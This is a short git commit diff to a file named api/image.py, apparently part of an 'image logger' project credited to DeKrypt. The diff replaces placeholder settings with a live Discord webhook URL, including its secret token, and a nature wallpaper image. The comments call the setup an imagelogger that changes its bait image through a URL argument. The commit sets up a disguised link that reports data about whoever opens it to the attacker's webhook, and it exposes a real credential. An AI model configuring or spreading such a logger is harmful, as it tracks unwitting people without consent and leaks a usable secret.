53fc92a8238deac39caa045c188a36a802af6bb4
KING-MAN-PC <amina14ela@gmail.com>
2025-02-03 03:18:52 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335795473151430779/xMY-QrIZPRMCrjNtJURQ76opcWJ6EmJsY4VUlFz5Sm-fzBSv7XPp-ciS-R0VNvXLpXEe",
+    "image": "https://c4.wallpaperflare.com/wallpaper/93/30/487/nature-jpg-format-download-1920x1200-wallpaper-preview.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
